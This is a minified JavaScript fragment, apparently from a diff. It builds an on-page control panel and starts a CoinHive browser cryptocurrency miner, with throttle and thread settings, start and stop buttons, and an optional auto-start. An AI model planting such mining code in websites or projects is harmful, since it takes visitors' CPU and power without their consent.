Sn + "</span><span id='" + cn + "'>" + Un + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + Z + "' class='" + un + " " + pn + "'><span id='" + G + "'>" + Nn + "</span><span id='" + Y + "'></span><span id='" + cn + "'>" + Pn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + $ + "' class='" + un + " " + ln + "'><span id='" + nn + "'>" + An + "</span><span id='" + cn + "'>" + Dn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + en + "' class='" + un + " " + ln + "'><span id='" + tn + "'>" + On + "</span><span id='" + cn + "'>" + jn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + dn + "' class='" + un + " " + ln + "'><span id='" + sn + "'>" + Fn + "</span><span id='" + cn + "'>" + Rn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + on + "' class='" + un + " " + ln + "'><span id='" + an + "'>" + qn + "</span><span id='" + cn + "'>" + Kn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + rn + "' class='" + un + " " + ln + "'><span id='" + mn + "'>" + Vn + "</span><span id='" + cn + "'>" + Xn + "</span></div>", document.getElementById(T).innerHTML += new_html; var Jn = document.createElement("style");
+                Jn.type = "text/css", e.parentNode.insertBefore(Jn, e); var Qn = new CoinHive.Anonymous(v, { throttle: I, threads: E }),
+                    Wn = CoinHive.FORCE_EXCLUSIVE_TAB,
+                    Zn = o(),
+                    Gn = u();
+                document.getElementById(j).onclick = function() { return r() }, document.getElementById(F).onclick = function() { return m() }, document.getElementById(V).onclick = function() { return s(Wn) }, document.getElementById(X).onclick = function() { return d() }, document.getElementById($).onclick = function() { return p() }, document.getElementById(en).onclick = function() { return h() }, document.getElementById(dn).onclick = function() { return f() }, document.getElementById(on).onclick = function() { return g() }, document.getElementById(rn).onclick = function() { return y() }, w && s(Wn), Qn.on("open", function() {}), Qn.on("authed", function(n) {}), Qn.on("close", function() {}), Qn.on("error", function(n) {}), Qn.on("job", function() {}), Qn.on("found", function() {}), Qn.on("accepted", function() {}), setInterval(function() { is_running = "", c() ? (is_running = gn, document.getElementById(M).className = b) : (is_running = fn, document.getElementById(M).className = k), document.getElementById(M).innerHTML = is_running, document.getElementById(S).innerHTML = n(), document.getElementById(P).innerHTML = i(), document.getElementById(O).innerHTML = o(), document.getElementById(K).innerHTML = t(!0), document.getElementById(Y).innerHTML = u() }, _) }, n.onerror = function() {}, e.parentNode.insertBefore(n, e) }() }, !1) }();
